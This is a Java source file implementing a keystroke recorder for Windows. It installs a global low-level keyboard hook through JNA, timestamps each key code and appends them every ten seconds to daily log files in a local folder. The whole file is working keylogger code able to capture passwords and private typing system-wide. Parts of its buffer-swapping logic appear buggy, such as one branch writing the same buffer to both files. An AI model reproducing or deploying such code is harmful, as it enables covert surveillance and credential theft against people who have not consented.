package com.lyc.security.recorder;

import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class KeyboardRecord implements Runnable{
    private WinUser.HHOOK hhk;
    boolean counter = false;

    private StringBuffer data1 = new StringBuffer();
    private StringBuffer data2 = new StringBuffer();
    private boolean flag;
    private static final Object lock = new Object();

    //钩子回调函数
    private WinUser.LowLevelKeyboardProc keyboardProc = new WinUser.LowLevelKeyboardProc() {
        public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT event) {
            // 输出按键值和按键时间
            if (nCode >= 0) {
                String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());

                if (counter) {
                    counter = false;
                    return User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
                }

                String str = time + "# KEY #" + event.vkCode + "\r\n";

                System.out.println(str);

                if (flag) {
                    data2.append(str);
                } else {
                    data1.append(str);
                }

            }
            counter = true;
            return User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
        }
    };

    public void run() {
        WriteFile f = new WriteFile();
        Thread t = new Thread(f);
        t.start();
        setHookOn();
    }

    // 安装钩子
    public void setHookOn() {
        System.out.println("Keyboard Recorder has launched");

        WinDef.HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        hhk = User32.INSTANCE.SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardProc, hMod, 0);

        int result;
        WinUser.MSG msg = new WinUser.MSG();
        while ((result = User32.INSTANCE.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                setHookOff();
                break;
            } else {
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
        }
    }

    // 移除钩子并退出
    public void setHookOff() {
        System.out.println("Exiting..");
        User32.INSTANCE.UnhookWindowsHookEx(hhk);
        System.exit(0);
    }

    private class WriteFile implements Runnable {
        public void run() {
            while (true) {
                //输出到文件
                try {
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
                    String filename = sdf.format(new Date());
                    File file1 = new File(".//log//" + filename + "_Keyboard.txt");
                    File file2 = new File(".//log//" + filename + "_General.txt");
                    File file3 = new File(".//log//");
                    if (!file3.exists()) {
                        file3.mkdirs();
                    }

                    if (!file2.exists()) {
                        file2.createNewFile();
                    }

                    if (!file1.exists()) {
                        file1.createNewFile();
                    }

                    if (data1.length() == 0 && data2.length() == 0) {
                        Thread.sleep(10000);
                    }

                    BufferedWriter bw1 = new BufferedWriter(new FileWriter(file1, true));
                    BufferedWriter bw2 = new BufferedWriter(new FileWriter(file2, true));

                    if (flag) {
                        if (data1.length() == 0) {
                            flag = false;
                            continue;
                        }
                        flag = false;
                        synchronized (lock) {
                            bw1.write(data1.toString());
                            bw2.write(data2.toString());

                            data1 = new StringBuffer();
                        }
                    } else {
                        if (data2.length()==0){
                            flag = true;
                            continue;
                        }
                        flag = true;
                        synchronized (lock) {
                            bw1.write(data2.toString());
                            bw2.write(data2.toString());

                            data2 = new StringBuffer();
                        }
                    }

                    bw1.flush();
                    bw2.flush();

                    bw1.close();
                    bw2.close();

                    Thread.sleep(10000);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
